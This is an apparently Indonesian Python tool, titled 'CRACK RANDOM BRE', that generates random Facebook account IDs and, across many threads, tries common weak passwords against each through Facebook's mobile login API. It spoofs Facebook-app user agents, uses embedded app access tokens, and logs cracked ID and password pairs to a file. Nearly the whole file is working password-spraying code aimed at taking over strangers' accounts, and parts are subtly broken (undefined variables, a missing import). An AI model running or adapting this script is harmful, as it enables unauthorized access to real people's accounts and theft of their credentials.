#========================================================#
# IMPORT
#========================================================#
import os, sys, time, uuid, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#========================================================#
# WARNA
#========================================================#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
y = "\x1b[1;33m"
b = "\x1b[1;34m"
m = "\x1b[1;35m"
c = "\x1b[1;36m"
w = "\x1b[1;37m"
H  = "\033[92m"
CY = "\033[96m"
K  = "\033[93m"
U  = "\033[95m"
W  = "\033[0m"
WH = "\033[97m"

loop = 0
oks = []
cps = []
rr = random.randint
rc = random.choice

def tahun(fx: str) -> str:
    """Perkirakan tahun pembuatan akun FB berdasarkan ID"""
    if not fx:
        return ""

    prefix_map = {
        '1000000000': '2009', '100000000': '2009',
        '10000000': '2009', '1000000': '2009',
        '1000006': '2010', '100001': '2010-2011',
        '100002': '2011-2012', '100004': '2012-2013',
        '100005': '2013-2014', '100007': '2014-2015',
        '100009': '2015', '10001': '2015-2016',
        '10002': '2016-2017', '10003': '2018',
        '10004': '2019', '10005': '2020',
        '10006': '2021-2022',
    }

    if len(fx) == 15:
        for k, v in prefix_map.items():
            if fx.startswith(k):
                return v
    elif len(fx) in (9, 10):
        return '2008-2009'
    elif len(fx) == 8:
        return '2007-2008'
    elif len(fx) == 7:
        return '2006-2007'
    return ""
#========================================================#
# BANNER
#========================================================#
def banner():
    os.system("clear")
    print(f"""
{g}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$$$$$$$\   $$$$$$\ $$$$$$$$\ $$$$$$$\  $$$$$$\  $$$$$$\ $$$$$$$$\ 
$$  __$$\ $$  __$$\\__$$  __|$$  __$$\ \_$$  _|$$  __$$\\__$$  __|
$$ |  $$ |$$ /  $$ |  $$ |   $$ |  $$ |  $$ |  $$ /  $$ |  $$ |   
$$$$$$$  |$$$$$$$$ |  $$ |   $$$$$$$  |  $$ |  $$ |  $$ |  $$ |   
$$  ____/ $$  __$$ |  $$ |   $$  __$$<   $$ |  $$ |  $$ |  $$ |   
$$ |      $$ |  $$ |  $$ |   $$ |  $$ |  $$ |  $$ |  $$ |  $$ |   
$$ |      $$ |  $$ |  $$ |   $$ |  $$ |$$$$$$\  $$$$$$  |  $$ |   
\__|      \__|  \__|  \__|   \__|  \__|\______| \______/   \__|   
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{r}CRACK RANDOM BRE
{y}AUTHOR : PATRIOT 
{g}STATUS : PRIBADI
{w}""")

def line():
    print(f"{m}--------------------------------------------------------{w}")

#========================================================#
# UA GENERATOR
#========================================================#
def ua_graph():
    android_versions = ["10", "11", "12", "13", "14"]
    devices = ["SM-G996B", "SM-A528B", "SM-M336B", "RMX3081", "V2149", "CPH2413"]
    chrome_major = rr(120, 132)

    fbav = f"{rr(410,470)}.0.0.{rr(10,90)}.{rr(10,120)}"
    fbbv = str(rr(500000000, 700000000))

    return (
        f"Mozilla/5.0 (Linux; Android {rc(android_versions)}; {rc(devices)} Build/SP1A.210812.016; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        f"Chrome/{chrome_major}.0.{rr(6000,7500)}.{rr(60,150)} Mobile Safari/537.36 "
        f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=2.75,width=1080,height=2400}};"
        f"FBLC/en_US;FBCR/Indosat;FBMF/samsung;FBBD/samsung;"
        f"FBPN/com.facebook.katana;FBDV/{rc(devices)};"
        f"FBSV/{rc(android_versions)};FBCA/arm64-v8a;]"
    )


def ua_bapi_gacor():
    android = rc(["6.0.1","7.0","8.1.0","9","10","11"])
    fbav = f"{rr(300,420)}.0.0.{rr(10,60)}.{rr(50,200)}"
    fbbv = rr(200000000,420000000)
    device = rc([
        "SM-A505F","SM-A307FN","SM-A125F","SM-J610F","Redmi Note 7",
        "Redmi Note 8","CPH2269","V2027","V2030","Infinix X688B"
    ])
    width = rc([720,1080])
    height = rc([1280,1520,2340])
    density = rc(["2.0","2.5","3.0"])

    return (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {device}) "
        f"FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/en_US;FBCR/;FBPN/com.facebook.katana;"
        f"FBDV/{device};FBSV/{android};FBOP/1;FBCA/arm64-v8a;"
    )

#========================================================#
# MAIN
#========================================================#
def VarkCozery():
    global ua
    user = []

    banner()
    print(f"{b}TARGET:{w} 10000 | 20000 | 90000")
    line()
    limit = input(f"{g}Input total target: {w}")

    line()
    print(f"{g}[1]{w} Tahun 2008–2009")
    print(f"{g}[2]{w} Tahun 2010–2015")
    line()
    ask = input(f"{g}Pilih tahun: {w}")

    line()
    print(f"{g}[1]{w} Method GRAPH {g}(COOKIES)")
    print(f"{g}[2]{w} Method API {y}(NO COOKIES)")
    line()
    mtd = input(f"{g}Pilih method: {w}")

    line()
    print(f"{g}[1]{w} High Speed (40)")
    print(f"{g}[2]{w} Normal Speed (30)")
    line()
    cspd = input(f"{g}Speed: {w}")
    speedx = 40 if cspd == "1" else 30

    # USER ID GENERATOR
    if ask == "1":
        sv = "[2008-2009]"
        for _ in range(int(limit)):
            user.append("1000000" + str(rr(11111111, 99999999)))

    elif ask == "2":
        sv = "[2010-2015]"
        for _ in range(int(limit)):
            user.append(
                rc(["100001", "100002", "100003"]) +
                str(rr(111111111, 999999999))
            )
    else:
        sv = "[2008-2010]"
        for _ in range(int(limit)):
            user.append(
                rc(["10000001", "10000000"]) +
                str(rr(1111111, 9999999))
            )

    # EXECUTOR
    banner()
    print(f"{g}TOTAL ID : {limit}")
    print(f"{g}TAHUN    : {sv}")
    line()

    with ThreadPool(max_workers=speedx) as ex:
        for uid in user:
            if mtd == "1":
                ex.submit(login1, uid, limit)
            else:
                ex.submit(login2, uid, limit)

    line()
    print(f"{g}TOTAL OK : {len(oks)}{w}")
    line()
    input("Enter to exit... ")

#========================================================#
# METHOD LOGIN 1 — GRAPH
#========================================================#
def login1(uid, tl):
    global loop, oks, cps, ua

    try:
        session = requests.Session()
        sys.stdout.write(
            f"\r{c}[GRAPH]{w} {uid} {c}[{loop}/{tl}] {g}OK:{len(oks)}{w}"
        )
        sys.stdout.flush()

        for pw in ("123456", "1234567", "12345678", "123456789"):
            ua = ua_graph()

            data = {
                "adid": str(uuid.uuid4()),
                "device_id": str(uuid.uuid4()),
                "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": pw,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "graphservice",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }

            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-FB-Connection-Quality": "EXCELLENT",
                "X-FB-Net-HNI": str(rr(20000, 40000)),
                "X-FB-SIM-HNI": str(rr(20000, 40000)),
                "X-FB-Connection-Bandwidth": str(rr(20000000, 50000000)),
            }

            res = session.post(
                "https://b-graph.facebook.com/auth/login",
                data=data,
                headers=headers,
                allow_redirects=False
            ).json()

            if "session_key" in res:
                cookie = ";".join(
                    f"{c['name']}={c['value']}"
                    for c in resp.get("session_cookies", [])
                )
                print(f"""
{g}┌──────────────────────────────┐
│         LOGIN SUCCESS        │
├──────────────────────────────┤
│ UID  : {uid}
│ PASS : {pw}
│ TAHUN : {tahun(uid)}
│ COOKIES : {cookies}
│ USER-AGENTS : {ua}
└──────────────────────────────┘{w}
""")
                open("/sdcard/PATRIOT-OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break

        loop += 1

    except:
        time.sleep(1)

#========================================================#
# METHOD LOGIN 2 — B-API
#========================================================#
def login2(uid, tl):
    global loop, oks, ua

    try:
        sys.stdout.write(
            f"\r{y}[API]{w} {uid} {c}[{loop}/{tl}] {g}OK:{len(oks)}{w}"
        )
        sys.stdout.flush()

        for pw in ["123456", "1234567", "12345678", "123456789"]:
            ua = ua_bapi_gacor()

            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Connection-Type": "cell.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Quality": "EXCELLENT",
                "X-FB-Connection-Bandwidth": str(rr(4000000, 9000000)),
                "X-FB-SIM-HNI": str(rr(20000, 40000)),
                "X-FB-NET-HNI": str(rr(20000, 40000)),
                "X-FB-Client-Port": str(rr(20000, 50000)),
                "X-FB-Server-Cluster": "True",
                "X-FB-Friendly-Name": "authenticate",
                "X-Tigon-Is-Retry": "False"
            }

            url = (
                "https://b-api.facebook.com/method/auth.login"
                f"?format=json&email={uid}&password={pw}"
                "&credentials_type=device_based_login_password"
                "&generate_session_cookies=1"
                "&error_detail_type=button_with_disabled"
                "&source=device_based_login"
                "&method=GET&locale=en_US&client_country_code=US"
                "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            )

            rp = requests.get(url, headers=headers).json()

            if "session_key" in rp or "Please Confirm Email" in str(rp):
               
                def kotak(warna, teks):
                    panjang = len(teks) + 2
                    atas   = f"{WH}┌{'─' * panjang}┐{W}"
                    isi    = f"{WH}│{W} {warna}{teks}{W} {WH}│{W}"
                    bawah  = f"{WH}└{'─' * panjang}┘{W}"
                    return atas + "\n" + isi + "\n" + bawah


                # kotak wrap (untuk UA panjang)
                def kotak_wrap(warna, teks, lebar=60):
                    lines = textwrap.wrap(teks, width=lebar)
                    max_len = max(len(line) for line in lines)
                    atas  = f"{WH}┌{'─' * (max_len + 2)}┐{W}"
                    isi   = "\n".join([f"{WH}│{W} {warna}{line.ljust(max_len)}{W} {WH}│{W}" for line in lines])
                    bawah = f"{WH}└{'─' * (max_len + 2)}┘{W}"
                    return atas + "\n" + isi + "\n" + bawah
                    
                print(f"{g}AKUN SUCCESS{W}")
                print(f"{WH}──────────────────────────────{W}")
                print(kotak(CY, uid))
                print(kotak(K, pw))
                print(kotak(U, ua))
                print(f"{WH}──────────────────────────────{W}")
                open("/sdcard/PATRIOT-OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break

        loop += 1

    except:
        time.sleep(1)

#========================================================#
# RUN
#========================================================#
if __name__ == "__main__":
    VarkCozery()
